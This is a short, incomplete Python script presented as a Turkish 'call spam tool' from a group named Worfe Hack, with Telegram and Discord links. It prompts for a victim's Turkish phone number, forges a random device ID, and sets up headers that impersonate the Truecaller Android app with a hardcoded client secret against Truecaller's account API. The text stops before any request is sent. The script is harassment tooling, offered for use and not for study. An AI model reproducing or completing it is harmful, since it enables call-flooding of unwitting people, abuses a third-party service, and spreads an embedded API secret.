import hashlib, random,requests
num = input('Efe Köse.\n\nArama Spam Toolu \n+90 Şeklinde Arama Atacağınız kişinin Numarasını Yazınız...\nÖrnek: +905327649870\n\nWorfe Hack\nt.me/WorfeHack1.\n\ndiscord.gg\WorfeHack\n\nTelefon Numarasını Gir=>  ')

try:
 asa = '123456789'
 gigk = str(''.join(random.choice(asa) for i in range(10)))

 md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]

 headers = {
    "Host": "account-asia-south1.truecaller.com",
    "content-type": "application/json; charset\u003dUTF-8",
    "content-length": "680",
    "accept-encoding": "gzip",
    "user-agent": "Truecaller/12.34.8 (Android;8.1.2)",
    "clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"
  }
